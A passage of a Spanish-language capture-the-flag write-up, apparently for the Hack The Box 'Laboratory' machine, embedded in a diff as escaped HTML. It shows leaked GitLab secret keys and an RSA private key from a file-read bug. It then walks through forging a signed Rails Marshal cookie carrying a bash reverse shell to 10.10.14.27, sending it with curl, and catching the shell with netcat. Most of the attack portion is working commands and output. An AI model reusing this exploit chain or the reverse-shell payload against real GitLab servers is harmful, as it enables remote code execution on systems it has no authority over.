+&lt;span class=&quot;c&quot;&gt;# erased! To change the contents below, edit /etc/gitlab/gitlab.rb  &lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;# and run `sudo gitlab-ctl reconfigure`.                                                                                         &lt;/span&gt;
+                                                                                                                                 
+&lt;span class=&quot;nt&quot;&gt;---&lt;/span&gt;                                                                                                                              
+production:                                                                                                                      
+  db_key_base: 627773a77f567a5853a5c6652018f3f6e41d04aa53ed1e0df33c66b04ef0c38b88f402e0e73ba7676e93f1e54e425f74d59528fb35b170a1b9
+d5ce620bc11838                                                                                                                   
+  secret_key_base: 3231f54b33e0c1ce998113c083528460153b19542a70173b4458a21e845ffa33cc45ca7486fc8ebb6b2727cc02feea4c3adbe2cc7b6500
+3510e4031e164137b3                                                                                                               
+  otp_key_base: db3432d6fa4c43e68bf7024f3c92fea4eeea1f6be1e6ebd6bb6e40e930f0933068810311dc9f0ec78196faa69e0aac01171d62f4e225d61e0
+b84263903fd06af                                                                                                                  
+  openid_connect_signing_key: |                                                                                                  
+    &lt;span class=&quot;nt&quot;&gt;-----BEGIN&lt;/span&gt; RSA PRIVATE KEY-----                                                                                              
+    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
+    &lt;span class=&quot;nt&quot;&gt;-----END&lt;/span&gt; RSA PRIVATE KEY-----
+
+
+&lt;span class=&quot;nt&quot;&gt;----------------------------------------&lt;/span&gt;
+
+&lt;span class=&quot;o&quot;&gt;[&amp;gt;]&lt;/span&gt; Absolute Path to File : 
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Despúes nos indica que debemos tener una instancia de gitlab en nuestra máquina, así que vamos a crearla. Primero instalamos lo que necesitamos con &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sudo apt install docker.io&lt;/code&gt; y &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sudo apt-get install -y curl openssh-server ca-certificates perl&lt;/code&gt;, despúes agregamos nuestro usuario en el grupo &lt;strong&gt;docker&lt;/strong&gt; con &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sudo usermod -a -G docker k4miyo&lt;/code&gt;. Ahora necesitamos la imagen de gitlab, lo cual la obtendremos y corremos con &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;docker run gitlab/gitlab-ce:12.8.1-ce.0&lt;/code&gt; (&lt;strong&gt;Nota&lt;/strong&gt;: El proceso puede tardar un rato).&lt;/p&gt;
+
+&lt;p&gt;Después de un rato a que se instale y ejecute todo lo que se necesita, ejecutaremos &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;docker ps&lt;/code&gt; para obtener el nombre del contenedor y luego &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;docker exec&lt;/code&gt; para obtener un shell:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ docker ps
+CONTAINER ID   IMAGE                          COMMAND             CREATED         STATUS                   PORTS                     NAMES
+dcee149e3692   gitlab/gitlab-ce:12.8.1-ce.0   &lt;span class=&quot;s2&quot;&gt;&quot;/assets/wrapper&quot;&lt;/span&gt;   2 minutes ago   Up 2 minutes &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;healthy&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;   22/tcp, 80/tcp, 443/tcp   suspicious_yonath
+❯ docker &lt;span class=&quot;nb&quot;&gt;exec&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-it&lt;/span&gt; suspicious_yonath bash
+root@dcee149e3692:/#
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;De acuerdo con el autor, tenemos que cambiar el valor de la variable  &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;secret_key_base&lt;/code&gt;, entonces lo hacemos:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@dcee149e3692:/# &lt;span class=&quot;nb&quot;&gt;head&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-n&lt;/span&gt; 10 /opt/gitlab/embedded/service/gitlab-rails/config/secrets.yml
+&lt;span class=&quot;c&quot;&gt;# This file is managed by gitlab-ctl. Manual changes will be&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;# erased! To change the contents below, edit /etc/gitlab/gitlab.rb&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;# and run `sudo gitlab-ctl reconfigure`.&lt;/span&gt;
+
+&lt;span class=&quot;nt&quot;&gt;---&lt;/span&gt;
+production:
+  db_key_base: 011b6fc5563759488d4d1651352dd288e858d0ebbb296c04aa4cad59405a4ed3ed416ae1bad4f901e2de36ba9c155539ec415c6d74305c3e23da323a55a625a3
+  secret_key_base: 3231f54b33e0c1ce998113c083528460153b19542a70173b4458a21e845ffa33cc45ca7486fc8ebb6b2727cc02feea4c3adbe2cc7b65003510e4031e164137b3
+  otp_key_base: ef967c004549aabb56054734d2da24eb605eea1d02f7c9757a9dea77cafd289d96deddad327ffd084a78cc98c4f0171b5477fae7f113a3c30d62f6bd8767d85a
+root@dcee149e3692:/#
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Aplicamos una reconfiguración con  &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;gitlab-ctl restart&lt;/code&gt; y ahora debemos ejecutar &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;gitlab-rails console&lt;/code&gt; para obtener una consola y ejecutar lo siguiente:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@dcee149e3692:/# gitlab-rails console
+&lt;span class=&quot;nt&quot;&gt;--------------------------------------------------------------------------------&lt;/span&gt;
+ GitLab:       12.8.1 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;d18b43a5f5a&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; FOSS
+ GitLab Shell: 11.0.0
+ PostgreSQL:   10.12
+&lt;span class=&quot;nt&quot;&gt;--------------------------------------------------------------------------------&lt;/span&gt;
+Loading production environment &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Rails 6.0.2&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+irb&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;main&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;:001:0&amp;gt; request &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; ActionDispatch::Request.new&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Rails.application.env_config&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; irb&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;main&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;:001:0&amp;gt; request.env[&lt;span class=&quot;s2&quot;&gt;&quot;action_dispatch.cookies_serializer&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; :marshal irb&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;main&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;:001:0&amp;gt; cookies &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; request.cookie_jar 
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Nos puede salir muchas lineas al ejecutar los comandos, es normal y es propia de ejcutar dichos comandos. Ahora, de acuerdo con el usuario, nos indica ejecutar &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;erb = ERB.new(&quot;&amp;lt;%= 'echo vakzz was here &amp;gt; /tmp/vakzz' %&amp;gt;&quot;)&lt;/code&gt;; nosotros lo cambiaremos para obtener una reverse shell:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;irb&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;main&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;:001:0&amp;gt; erb &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; ERB.new&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&amp;lt;%= &lt;/span&gt;&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;bash &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'bash -i &amp;gt;&amp;amp; /dev/tcp/10.10.14.27/443 0&amp;gt;&amp;amp;1'&lt;/span&gt;&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt; %&amp;gt;&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Y por último, ejecutamos los siguientes comandos:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;irb&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;main&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;:001:0&amp;gt; depr &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy.new&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;erb, :result, &lt;span class=&quot;s2&quot;&gt;&quot;@result&quot;&lt;/span&gt;, ActiveSupport::Deprecation.new&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 
+irb&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;main&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;:001:0&amp;gt; cookies.signed[:cookie] &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; depr puts 
+irb&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;main&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;:008:0&amp;gt; puts cookies[:cookie]
+&lt;span class=&quot;nv&quot;&gt;BAhvOkBBY3RpdmVTdXBwb3J0OjpEZXByZWNhdGlvbjo6RGVwcmVjYXRlZEluc3RhbmNlVmFyaWFibGVQcm94eQk6DkBpbnN0YW5jZW86CEVSQgs6EEBzYWZlX2xldmVsMDoJQHNyY0kidCNjb2Rpbmc6VVRGLTgKX2VyYm91dCA9ICsnJzsgX2VyYm91dC48PCgoIGBiYXNoIC1jICdiYXNoIC1pID4mIC9kZXYvdGNwLzEwLjEwLjE0LjI3LzQ0MyAwPiYxJ2AgKS50b19zKTsgX2VyYm91dAY6BkVGOg5AZW5jb2RpbmdJdToNRW5jb2RpbmcKVVRGLTgGOwpGOhNAZnJvemVuX3N0cmluZzA6DkBmaWxlbmFtZTA6DEBsaW5lbm9pADoMQG1ldGhvZDoLcmVzdWx0OglAdmFySSIMQHJlc3VsdAY7ClQ6EEBkZXByZWNhdG9ySXU6H0FjdGl2ZVN1cHBvcnQ6OkRlcHJlY2F0aW9uAAY7ClQ&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;--eb4fb167aa8fa2da52b6edf10473d0a9e8baa71d&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; nil
+irb&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;main&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;:009:0&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Obtenemos una cookie, la cual debemos mandar al servidor; pero antes, nos ponemos en escucha por el puerto 443:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ curl &lt;span class=&quot;nt&quot;&gt;-vvv&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'https://git.laboratory.htb/users/sign_in'&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-b&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;experimentation_subject_id=BAhvOkBBY3RpdmVTdXBwb3J0OjpEZXByZWNhdGlvbjo
+6RGVwcmVjYXRlZEluc3RhbmNlVmFyaWFibGVQcm94eQk6DkBpbnN0YW5jZW86CEVSQgs6EEBzYWZlX2xldmVsMDoJQHNyY0kidCNjb2Rpbmc6VVRGLTgKX2VyYm91dCA9
+ICsnJzsgX2VyYm91dC48PCgoIGBiYXNoIC1jICdiYXNoIC1pID4mIC9kZXYvdGNwLzEwLjEwLjE0LjI3LzQ0MyAwPiYxJ2AgKS50b19zKTsgX2VyYm91dAY6BkVGOg5AZ
+W5jb2RpbmdJdToNRW5jb2RpbmcKVVRGLTgGOwpGOhNAZnJvemVuX3N0cmluZzA6DkBmaWxlbmFtZTA6DEBsaW5lbm9pADoMQG1ldGhvZDoLcmVzdWx0OglAdmFySSIMQHJlc3VsdAY7ClQ6EEBkZXByZWNhdG9ySXU6H0FjdGl2ZVN1cHBvcnQ6OkRlcHJlY2F0aW9uAAY7ClQ=--b07f80bd22c0771d604978b4577f643e0891f603&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-k&lt;/span&gt;     &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;   Trying 10.10.10.216:443...                                                                                                   &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; Connected to git.laboratory.htb &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;10.10.10.216&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; port 443 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;c&quot;&gt;#0)                                                                   * ALPN, offering h2                                                                                                              &lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; ALPN, offering http/1.1                                       
+&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; successfully &lt;span class=&quot;nb&quot;&gt;set &lt;/span&gt;certificate verify locations:                                                                                 
+&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;  CAfile: /etc/ssl/certs/ca-certificates.crt                                                                                    
+&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;  CApath: /etc/ssl/certs                                                                                                        
+&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; TLSv1.3 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;OUT&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, TLS handshake, Client hello &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;:                                                                                
+&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; TLSv1.3 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;IN&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, TLS handshake, Server hello &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;2&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;:
+&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; TLSv1.3 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;IN&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, TLS handshake, Encrypted Extensions &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;8&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;:
+&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; TLSv1.3 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;IN&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, TLS handshake, Certificate &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;11&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;:
+&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; TLSv1.3 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;IN&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, TLS handshake, CERT verify &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;15&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;:
+&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; TLSv1.3 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;IN&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, TLS handshake, Finished &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;20&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;:
+&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; TLSv1.3 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;OUT&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, TLS change cipher, Change cipher spec &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;:
+&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; TLSv1.3 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;OUT&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, TLS handshake, Finished &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;20&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;:
+&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; SSL connection using TLSv1.3 / TLS_AES_256_GCM_SHA384
+&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; ALPN, server accepted to use http/1.1
+&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; Server certificate:
+&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;  subject: &lt;span class=&quot;nv&quot;&gt;CN&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;laboratory.htb
+&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;  start &lt;span class=&quot;nb&quot;&gt;date&lt;/span&gt;: Jul  5 10:39:28 2020 GMT
+&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;  expire &lt;span class=&quot;nb&quot;&gt;date&lt;/span&gt;: Mar  3 10:39:28 2024 GMT
+&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;  issuer: &lt;span class=&quot;nv&quot;&gt;CN&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;laboratory.htb
+&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;  SSL certificate verify result: self signed certificate &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;18&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, continuing anyway.
+&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; GET /users/sign_in HTTP/1.1
+&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; Host: git.laboratory.htb
+&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; User-Agent: curl/7.74.0
+&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; Accept: &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;/&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; Cookie: &lt;span class=&quot;nv&quot;&gt;experimentation_subject_id&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;BAhvOkBBY3RpdmVTdXBwb3J0OjpEZXByZWNhdGlvbjo6RGVwcmVjYXRlZEluc3RhbmNlVmFyaWFibGVQcm94eQk6DkBp
+bnN0YW5jZW86CEVSQgs6EEBzYWZlX2xldmVsMDoJQHNyY0kidCNjb2Rpbmc6VVRGLTgKX2VyYm91dCA9ICsnJzsgX2VyYm91dC48PCgoIGBiYXNoIC1jICdiYXNoIC1pI
+D4mIC9kZXYvdGNwLzEwLjEwLjE0LjI3LzQ0MyAwPiYxJ2AgKS50b19zKTsgX2VyYm91dAY6BkVGOg5AZW5jb2RpbmdJdToNRW5jb2RpbmcKVVRGLTgGOwpGOhNAZnJvem
+VuX3N0cmluZzA6DkBmaWxlbmFtZTA6DEBsaW5lbm9pADoMQG1ldGhvZDoLcmVzdWx0OglAdmFySSIMQHJlc3VsdAY7ClQ6EEBkZXByZWNhdG9ySXU6H0FjdGl2ZVN1cHB
+&lt;span class=&quot;nv&quot;&gt;vcnQ6OkRlcHJlY2F0aW9uAAY7ClQ&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;--b07f80bd22c0771d604978b4577f643e0891f603&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; 
+&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; TLSv1.3 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;IN&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, TLS handshake, Newsession Ticket &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;4&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;:
+&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; TLSv1.3 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;IN&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, TLS handshake, Newsession Ticket &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;4&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;:
+&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; old SSL session ID is stale, removing
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ nc &lt;span class=&quot;nt&quot;&gt;-nlvp&lt;/span&gt; 443
+listening on &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;any] 443 ...
+connect to &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;10.10.14.27] from &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;UNKNOWN&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;10.10.10.216] 35010
+bash: cannot &lt;span class=&quot;nb&quot;&gt;set &lt;/span&gt;terminal process group &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;405&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;: Inappropriate ioctl &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;device
+bash: no job control &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;this shell
+git@git:~/gitlab-rails/working&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;whoami
+whoami
+&lt;/span&gt;git
+git@git:~/gitlab-rails/working&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Ya nos encontramos dentro de la máquina víctima como el usuario &lt;strong&gt;git&lt;/strong&gt;; sin embargo, vemos que nos encontramos dentro de un contenedor:&lt;/p&gt;
+
